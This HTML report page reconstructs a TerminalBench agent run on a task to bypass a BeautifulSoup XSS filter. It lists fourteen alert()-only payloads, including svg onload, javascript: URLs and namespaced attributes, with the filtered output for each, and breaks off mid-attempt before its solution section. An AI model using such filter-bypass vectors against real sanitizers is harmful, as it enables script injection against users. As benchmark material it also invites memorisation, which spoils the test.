@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>01_break-filter-js-from-html — TerminalBench Trajectory</title>
+<style>
+:root {
+  --bg: #0f1419;
+  --bg2: #1a2332;
+  --bg3: #243044;
+  --border: #2d3a4f;
+  --text: #e7ecf3;
+  --muted: #9aa8bc;
+  --accent: #5b9fd4;
+  --accent2: #7c6cf0;
+  --ok: #3dd68c;
+  --ok-bg: rgba(61,214,140,.12);
+  --fail: #f07178;
+  --fail-bg: rgba(240,113,120,.12);
+  --partial: #e6b450;
+  --partial-bg: rgba(230,180,80,.12);
+  --user: #5b9fd4;
+  --agent: #a8d4a0;
+  --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+  --sans: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  --radius: 10px;
+  --shadow: 0 8px 24px rgba(0,0,0,.35);
+}
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  margin: 0;
+  font-family: var(--sans);
+  background: radial-gradient(1200px 600px at 10% -10%, #1a2740 0%, transparent 50%),
+              radial-gradient(900px 500px at 100% 0%, #1a2038 0%, transparent 45%),
+              var(--bg);
+  color: var(--text);
+  line-height: 1.55;
+  min-height: 100vh;
+}
+a { color: var(--accent); }
+.wrap { max-width: 1080px; margin: 0 auto; padding: 28px 20px 80px; }
+header.hero {
+  background: linear-gradient(135deg, var(--bg2), var(--bg3));
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 28px 28px 22px;
+  box-shadow: var(--shadow);
+  margin-bottom: 28px;
+  position: relative;
+  overflow: hidden;
+}
+header.hero::after {
+  content: "";
+  position: absolute;
+  inset: auto -20% -40% 40%;
+  height: 180px;
+  background: radial-gradient(circle, rgba(91,159,212,.18), transparent 70%);
+  pointer-events: none;
+}
+.eyebrow {
+  display: inline-flex; gap: 8px; flex-wrap: wrap;
+  font-size: 12px; letter-spacing: .04em; text-transform: uppercase;
+  color: var(--muted); margin-bottom: 10px;
+}
+.eyebrow span {
+  background: var(--bg); border: 1px solid var(--border);
+  padding: 3px 8px; border-radius: 999px;
+}
+.eyebrow .ok { color: var(--ok); border-color: rgba(61,214,140,.35); background: var(--ok-bg); }
+h1 {
+  margin: 0 0 8px; font-size: 1.75rem; letter-spacing: -0.02em;
+  line-height: 1.25;
+}
+.subtitle { color: var(--muted); margin: 0 0 18px; max-width: 70ch; }
+.meta-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+  gap: 10px;
+}
+.meta {
+  background: rgba(0,0,0,.2);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 10px 12px;
+}
+.meta .k { display:block; font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: .05em; }
+.meta .v { font-family: var(--mono); font-size: 13px; word-break: break-all; }
+nav.toc {
+  display: flex; flex-wrap: wrap; gap: 8px;
+  margin: 22px 0 8px;
+}
+nav.toc a {
+  text-decoration: none;
+  background: var(--bg);
+  border: 1px solid var(--border);
+  color: var(--text);
+  padding: 6px 12px;
+  border-radius: 999px;
+  font-size: 13px;
+}
+nav.toc a:hover { border-color: var(--accent); color: var(--accent); }
+section {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  padding: 22px 24px;
+  margin-bottom: 20px;
+  box-shadow: 0 2px 12px rgba(0,0,0,.2);
+}
+section h2 {
+  margin: 0 0 14px;
+  font-size: 1.2rem;
+  letter-spacing: -0.01em;
+  display: flex; align-items: center; gap: 10px;
+}
+section h2 .num {
+  display:inline-flex; align-items:center; justify-content:center;
+  width: 28px; height: 28px; border-radius: 8px;
+  background: var(--bg3); color: var(--accent);
+  font-size: 13px; font-family: var(--mono);
+}
+.task-box {
+  background: var(--bg);
+  border-left: 3px solid var(--accent2);
+  padding: 14px 16px;
+  border-radius: 0 8px 8px 0;
+  font-size: 14.5px;
+}
+.task-box code {
+  font-family: var(--mono);
+  background: var(--bg3);
+  padding: 1px 5px;
+  border-radius: 4px;
+  font-size: 0.92em;
+}
+.filter-rules {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  gap: 12px;
+  margin-top: 12px;
+}
+.rule {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 12px 14px;
+}
+.rule h4 { margin: 0 0 6px; font-size: 13px; color: var(--accent); }
+.rule p { margin: 0; font-size: 13px; color: var(--muted); }
+.rule code { font-family: var(--mono); color: var(--text); }
+.pseudo {
+  margin-top: 14px;
+  background: #0b1017;
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  overflow: hidden;
+}
+.pseudo .code-label, .code-label {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: .06em;
+  color: var(--muted);
+  padding: 8px 12px;
+  border-bottom: 1px solid var(--border);
+  background: rgba(255,255,255,.02);
+}
+.pseudo pre, .code-block pre {
+  margin: 0;
+  padding: 12px 14px;
+  overflow: auto;
+  font-family: var(--mono);
+  font-size: 12.5px;
+  line-height: 1.45;
+  color: #c5d0de;
+  white-space: pre-wrap;
+  word-break: break-word;
+}
+.code-block {
+  background: #0b1017;
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  overflow: hidden;
+  margin: 10px 0;
+}
+.phases { list-style: none; padding: 0; margin: 0; display: grid; gap: 10px; }
+.phases li {
+  display: grid;
+  grid-template-columns: 36px 1fr;
+  gap: 12px;
+  align-items: start;
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 12px 14px;
+}
+.ph-n {
+  width: 28px; height: 28px; border-radius: 50%;
+  display:flex; align-items:center; justify-content:center;
+  background: var(--bg3); color: var(--accent2);
+  font-weight: 700; font-size: 13px;
+}
+.phases p { margin: 4px 0 0; color: var(--muted); font-size: 13.5px; }
+.controls {
+  display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 14px; align-items: center;
+}
+.controls button, .controls label {
+  font: inherit; font-size: 13px;
+}
+.controls button {
+  background: var(--bg);
+  color: var(--text);
+  border: 1px solid var(--border);
+  border-radius: 999px;
+  padding: 6px 12px;
+  cursor: pointer;
+}
+.controls button:hover, .controls button.active {
+  border-color: var(--accent);
+  color: var(--accent);
+}
+.controls label { color: var(--muted); display:flex; align-items:center; gap:6px; }
+.controls input[type="search"] {
+  background: var(--bg); color: var(--text);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 7px 10px;
+  min-width: 200px;
+  font: inherit; font-size: 13px;
+}
+.attempt {
+  border: 1px solid var(--border);
+  background: var(--bg);
+  border-radius: 12px;
+  padding: 14px 16px;
+  margin-bottom: 12px;
+}
+.attempt[data-status="success"] { border-color: rgba(61,214,140,.45); box-shadow: inset 0 0 0 1px rgba(61,214,140,.12); }
+.attempt header {
+  display: flex; flex-wrap: wrap; align-items: center; gap: 8px 10px;
+  margin-bottom: 6px;
+}
+.attempt h3 { margin: 0; font-size: 1rem; flex: 1 1 auto; }
+.attempt-n {
+  font-family: var(--mono); color: var(--muted); font-size: 12px;
+}
+.badge {
+  font-size: 11px; font-weight: 700; letter-spacing: .04em;
+  text-transform: uppercase;
+  padding: 3px 8px; border-radius: 999px;
+}
+.badge-fail { background: var(--fail-bg); color: var(--fail); }
+.badge-ok { background: var(--ok-bg); color: var(--ok); }
+.badge-partial { background: var(--partial-bg); color: var(--partial); }
+.step-pill {
+  font-family: var(--mono); font-size: 11px; color: var(--muted);
+  background: var(--bg3); padding: 2px 7px; border-radius: 6px;
+}
+.why { margin: 0 0 8px; color: var(--muted); font-size: 13.5px; }
+.timeline { list-style: none; margin: 0; padding: 0; position: relative; }
+.timeline::before {
+  content: "";
+  position: absolute; left: 18px; top: 6px; bottom: 6px;
+  width: 2px; background: var(--border);
+}
+.timeline li {
+  position: relative;
+  padding: 0 0 14px 48px;
+}
+.timeline li::before {
+  content: "";
+  position: absolute; left: 12px; top: 6px;
+  width: 14px; height: 14px; border-radius: 50%;
+  background: var(--bg3);
+  border: 2px solid var(--accent);
+}
+.timeline li.tl-user::before { border-color: var(--user); }
+.timeline li.tl-agent::before { border-color: var(--agent); }
+.tl-step {
+  font-family: var(--mono); font-size: 12px; color: var(--accent);
+  display: inline-block; min-width: 4.5rem;
+}
+.tl-who {
+  font-size: 11px; text-transform: uppercase; letter-spacing: .05em;
+  color: var(--muted); margin-right: 8px;
+}
+.tl-text { font-size: 14px; }
+.solution {
+  background: linear-gradient(180deg, rgba(61,214,140,.08), transparent 60%), var(--bg);
+  border: 1px solid rgba(61,214,140,.35);
+  border-radius: 12px;
+  padding: 16px;
+}
+.solution h3 { margin: 0 0 8px; color: var(--ok); }
+.callout {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  gap: 10px;
+  margin-top: 12px;
+}
+.callout div {
+  background: rgba(0,0,0,.2);
+  border-radius: 8px;
+  padding: 10px 12px;
+  border: 1px solid var(--border);
+  font-size: 13.5px;
+}
+.callout strong { display:block; color: var(--accent); font-size: 12px; text-transform: uppercase; letter-spacing: .04em; margin-bottom: 4px; }
+.verdict {
+  display: flex; flex-wrap: wrap; gap: 12px; align-items: stretch;
+}
+.verdict .card {
+  flex: 1 1 200px;
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 14px;
+}
+.verdict .card.ok { border-color: rgba(61,214,140,.4); background: var(--ok-bg); }
+.verdict .big { font-size: 1.4rem; font-weight: 700; }
+.verdict .muted { color: var(--muted); font-size: 13px; }
+.kicker {
+  font-family: var(--mono); font-size: 12.5px;
+  background: #0b1017; border: 1px solid rgba(61,214,140,.3);
+  color: var(--ok); padding: 10px 12px; border-radius: 8px;
+  margin-top: 10px;
+}
+details.raw {
+  margin-top: 8px;
+}
+details.raw summary {
+  cursor: pointer; color: var(--muted); font-size: 13px;
+}
+footer.page-foot {
+  text-align: center; color: var(--muted); font-size: 12px; margin-top: 28px;
+}
+.hidden { display: none !important; }
+@media (max-width: 600px) {
+  header.hero, section { padding: 16px; }
+  h1 { font-size: 1.35rem; }
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="hero">
+    <div class="eyebrow">
+      <span>TerminalBench</span>
+      <span>terminal_devops</span>
+      <span>upstream</span>
+      <span class="ok">task solved</span>
+    </div>
+    <h1>break-filter-js-from-html</h1>
+    <p class="subtitle">
+      An agent must craft an HTML file that still fires <code style="font-family:var(--mono);background:var(--bg3);padding:1px 5px;border-radius:4px">alert()</code>
+      after an in-place BeautifulSoup “XSS filter” removes scripts, embeds, and event-handler attributes.
+      This page reconstructs the full trajectory of failed vectors and the comment-opacity bypass that finally worked.
+    </p>
+    <div class="meta-grid">
+      <div class="meta"><span class="k">Case ID</span><span class="v">01_break-filter-js-from-html</span></div>
+      <div class="meta"><span class="k">Model</span><span class="v">claude-haiku-4-5-20251001</span></div>
+      <div class="meta"><span class="k">Agent</span><span class="v">claude-code</span></div>
+      <div class="meta"><span class="k">Duration</span><span class="v">223.1 s</span></div>
+      <div class="meta"><span class="k">Trajectory steps</span><span class="v">121 (nested JSON string)</span></div>
+      <div class="meta"><span class="k">Format</span><span class="v">terminalbench-json</span></div>
+      <div class="meta"><span class="k">Tokens in/out</span><span class="v">3,012,205 / 1,757</span></div>
+      <div class="meta"><span class="k">Est. cost</span><span class="v">$0.31</span></div>
+    </div>
+    <nav class="toc" aria-label="Sections">
+      <a href="#task">Task</a>
+      <a href="#filter">Filter</a>
+      <a href="#strategy">Strategy</a>
+      <a href="#attempts">Attempts</a>
+      <a href="#solution">Solution</a>
+      <a href="#timeline">Timeline</a>
+      <a href="#verdict">Verdict</a>
+    </nav>
+  </header>
+
+  <section id="task">
+    <h2><span class="num">01</span> Task statement</h2>
+    <div class="task-box">
+      <p>There’s a <code>/app/filter.py</code> script that attempts to remove JavaScript from HTML files to prevent XSS attacks.
+      The script takes an HTML file as a command-line argument and modifies it <em>in-place</em>.</p>
+      <p><strong>Usage:</strong> <code>python /app/filter.py <html_file></code></p>
+      <p>Create <code>/app/out.html</code> that, <strong>even after</strong> being processed by <code>/app/filter.py</code>, still triggers a JavaScript <code>alert()</code> when opened in a browser.
+      No user interaction; the alert must fire automatically.</p>
+      <p>Verification: <code>python /app/test_outputs.py</code> (function <code>test_out_html_bypasses_filter</code>).</p>
+    </div>
+  </section>
+
+  <section id="filter">
+    <h2><span class="num">02</span> How the filter works <span style="font-weight:500;color:var(--muted);font-size:13px">(as reconstructed by the agent)</span></h2>
+    <p style="margin:0 0 8px;color:var(--muted);font-size:14px">
+      The trajectory’s Read observations for <code style="font-family:var(--mono)">filter.py</code> and <code style="font-family:var(--mono)">test_outputs.py</code>
+      are stubbed as place-holders (<code style="font-family:var(--mono)">$32</code>, <code style="font-family:var(--mono)">$35</code>) in the dumped JSON,
+      but the agent’s subsequent reasoning and quoted snippets are consistent. Behavior inferred:
+    </p>
+    <div class="filter-rules">
+      <div class="rule">
+        <h4>1. Parse with BeautifulSoup</h4>
+        <p>HTML is loaded into a DOM-like tree, then serialized back — not a raw regex scrubber.</p>
+      </div>
+      <div class="rule">
+        <h4>2. Drop dangerous tags</h4>
+        <p>Removes <code><script></code>, <code><frame></code>, <code><iframe></code>, <code><object></code>, <code><embed></code> (decompose / extract).</p>
+      </div>
+      <div class="rule">
+        <h4>3. Strip on* attributes</h4>
+        <p>For every tag from <code>find_all(True)</code>, delete attrs where <code>attr.startswith("on")</code> (after BS lowercasing).</p>
+      </div>
+      <div class="rule">
+        <h4>4. Blind spot: comments</h4>
+        <p><code>find_all(True)</code> returns tags only. Comment nodes are not walked, so nested markup inside comments is never sanitized.</p>
+      </div>
+    </div>
+    <div class="pseudo">
+      <div class="code-label">Reconstructed filter logic (paraphrase, not original file bytes)</div>
+      <pre>from bs4 import BeautifulSoup
+
+def filter_html(path):
+    with open(path) as f:
+        soup = BeautifulSoup(f.read(), "html.parser")
+
+    for tag in soup.find_all(["script", "frame", "iframe", "object", "embed"]):
+        tag.decompose()
+
+    for tag in soup.find_all(True):
+        for attr in list(tag.attrs):
+            if attr.startswith("on"):
+                del tag.attrs[attr]
+
+    with open(path, "w") as f:
+        f.write(str(soup))</pre>
+    </div>
+    <p style="margin:12px 0 0;font-size:13px;color:var(--muted)">
+      The test suite runs the filter on <code style="font-family:var(--mono)">/app/out.html</code>, then loads the result in a headless browser and asserts that an <code style="font-family:var(--mono)">alert()</code> was observed.
+      Mid-run the agent also created <code style="font-family:var(--mono)">/tests/filter.py</code> (copy of <code style="font-family:var(--mono)">/app/filter.py</code>) because the harness expected that path.
+    </p>
+  </section>
+
+  <section id="strategy">
+    <h2><span class="num">03</span> Approach in phases</h2>
+    <ol class="phases">
+      <li><span class="ph-n">1</span><div><strong>Read &amp; model the filter</strong><p>Inspect filter.py / test_outputs.py; inventory removed tags and on* attribute wipe.</p></div></li><li><span class="ph-n">2</span><div><strong>Classic XSS vectors</strong><p>script, on*, iframe/object/embed — all matched by Table-stakes rules.</p></div></li><li><span class="ph-n">3</span><div><strong>Protocol handlers</strong><p>javascript: in meta/base/a — often left intact but not auto-fired by the headless test browser.</p></div></li><li><span class="ph-n">4</span><div><strong>Parser / Unicode tricks</strong><p>Case, namespaces, RTL override, newline smuggling — mostly defeated by BeautifulSoup normalization or browser name matching.</p></div></li><li><span class="ph-n">5</span><div><strong>Comment opacity</strong><p>Comments are not tags: filter never touches content inside them. That is the wedge.</p></div></li><li><span class="ph-n">6</span><div><strong>Verify</strong><p>python -c &quot;from test_outputs import test_out_html_bypasses_filter; …&quot; → Alert successfully triggered.</p></div></li>
+    </ol>
+  </section>
+
+  <section id="attempts">
+    <h2><span class="num">04</span> Bypass attempts</h2>
+    <p style="margin:0 0 12px;color:var(--muted);font-size:14px">
+      18 notable payloads (of ~30 Write calls). Filter early. Click status chips to filter the list.
+    </p>
+    <div class="controls">
+      <button type="button" class="active" data-filter="all">All</button>
+      <button type="button" data-filter="fail">Failed</button>
+      <button type="button" data-filter="partial">Partial</button>
+      <button type="button" data-filter="success">Success</button>
+      <label>Search <input type="search" id="q" placeholder="svg, comment, onerror…"></label>
+    </div>
+    <div id="attempt-list">
+      
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#1</span>
+    <h3>SVG onload</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 9</span>
+  </header>
+  <p class="why">Filter strips attributes starting with on — onload removed.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;svg onload=&quot;alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;
+    &lt;/svg&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  <div class="code-block"><div class="code-label">After filter.py</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;svg&gt;
+&lt;/svg&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#2</span>
+    <h3>meta refresh javascript:</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 17</span>
+  </header>
+  <p class="why">Survives filter but modern browsers refuse javascript: in meta refresh; test asserts no alert.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;XSS Bypass&lt;/title&gt;
+    &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  <div class="code-block"><div class="code-label">After filter.py</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;meta content=&quot;0;url=javascript:alert(&#x27;XSS Bypass!&#x27;)&quot; http-equiv=&quot;refresh&quot;/&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#3</span>
+    <h3>img title=javascript:</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 37</span>
+  </header>
+  <p class="why">title does not execute JavaScript.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;XSS Bypass&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;img src=&quot;x&quot; alt=&quot;test&quot; title=&quot;javascript:alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#4</span>
+    <h3>base href=javascript:</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 41</span>
+  </header>
+  <p class="why">Survives filter but does not auto-execute without navigation.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;XSS Bypass&lt;/title&gt;
+    &lt;base href=&quot;javascript:alert(&#x27;XSS Bypass!&#x27;);&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  <div class="code-block"><div class="code-label">After filter.py</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;base href=&quot;javascript:alert(&#x27;XSS Bypass!&#x27;);&quot;/&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#5</span>
+    <h3>a href=javascript: + autofocus</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 45</span>
+  </header>
+  <p class="why">Attributes survive, but autofocus alone will not click the link / run the javascript: URL.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;XSS Bypass&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;a href=&quot;javascript:alert(&#x27;XSS Bypass!&#x27;)&quot; autofocus&gt;Click&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  <div class="code-block"><div class="code-label">After filter.py</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;a autofocus=&quot;&quot; href=&quot;javascript:alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;Click&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#6</span>
+    <h3>link data: CSS</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 51</span>
+  </header>
+  <p class="why">CSS cannot run alert(); exploratory dead end.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;XSS Bypass&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;data:text/css,body{background:red}&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#7</span>
+    <h3>style url(javascript:)</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 57</span>
+  </header>
+  <p class="why">javascript: URLs in CSS url() are ignored by modern browsers.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;XSS Bypass&lt;/title&gt;
+    &lt;style&gt;
+        body { background: url(&#x27;javascript:alert(&quot;XSS Bypass!&quot;)&#x27;); }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#8</span>
+    <h3>Fake attribute error=</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 61</span>
+  </header>
+  <p class="why">Not a real event handler; browsers ignore it.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;XSS Bypass&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;img src=&quot;x&quot; error=&quot;alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#9</span>
+    <h3>onLoad casing</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 63</span>
+  </header>
+  <p class="why">BeautifulSoup lowercases attributes; startswith(&#x27;on&#x27;) still catches onload.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;XSS Bypass&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;img src=&quot;x&quot; onLoad=&quot;alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#10</span>
+    <h3>iframe data: HTML</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 65</span>
+  </header>
+  <p class="why">iframe tags are explicitly removed by the filter.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;XSS Bypass&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(&#x27;XSS Bypass!&#x27;)&lt;/script&gt;&quot; autofocus&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#11</span>
+    <h3>SVG foreignObject + img onerror</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 67</span>
+  </header>
+  <p class="why">Nested tags are still walked by find_all(True); onerror stripped.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!-- reconstructed from agent reasoning + filter output --&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+  &lt;foreignObject width=&quot;100&quot; height=&quot;100&quot;&gt;
+    &lt;body xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+      &lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;
+    &lt;/body&gt;
+  &lt;/foreignObject&gt;
+&lt;/svg&gt;</pre></div>
+  <div class="code-block"><div class="code-label">After filter.py</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+&lt;foreignobject height=&quot;100&quot; width=&quot;100&quot;&gt;
+&lt;body xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+&lt;img src=&quot;x&quot;/&gt;
+&lt;/body&gt;
+&lt;/foreignobject&gt;
+&lt;/svg&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#12</span>
+    <h3>script type=text/x-custom</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 73</span>
+  </header>
+  <p class="why">All script tags are decomposed regardless of type.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;XSS Bypass&lt;/title&gt;
+    &lt;script type=&quot;text/x-custom&quot;&gt;alert(&#x27;XSS Bypass!&#x27;)&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#13</span>
+    <h3>Broken quote / onmouseover smuggling</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 81</span>
+  </header>
+  <p class="why">onmouseover still removed; leftover quote artifact &quot;=&quot;&quot; is harmless.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;XSS Bypass&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;img src=&quot;x&quot; alt=&quot;test&quot; title=&quot;&quot; onmouseover=&quot;alert(&#x27;XSS Bypass!&#x27;)=&quot;&quot;&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  <div class="code-block"><div class="code-label">After filter.py</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;img &quot;=&quot;&quot; alt=&quot;test&quot; src=&quot;x&quot; title=&quot;&quot;/&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</article>
+
+<article class="attempt" data-status="fail">
+  <header>
+    <span class="attempt-n">#14</span>
+    <h3>Namespaced ev:onload</h3>
+    <span class="badge badge-fail">Failed</span>
+    <span class="step-pill">step 85</span>
+  </header>
+  <p class="why">Survives startswith(&#x27;on&#x27;) check but browser does not treat ev:onload as an HTML event handler on img.</p>
+  <div class="code-block"><div class="code-label">Payload written to /app/out.html</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;XSS Bypass&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+    &lt;img src=&quot;x&quot; ev:onload=&quot;alert(&#x27;XSS Bypass!&#x27;)&quot;&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+  <div class="code-block"><div class="code-label">After filter.py</div><pre>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;XSS Bypass&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;img ev:onload=&quot;alert(&#x27;XSS Bypass!&#x27;)&quot; src=&quot;x&quot;/&gt;
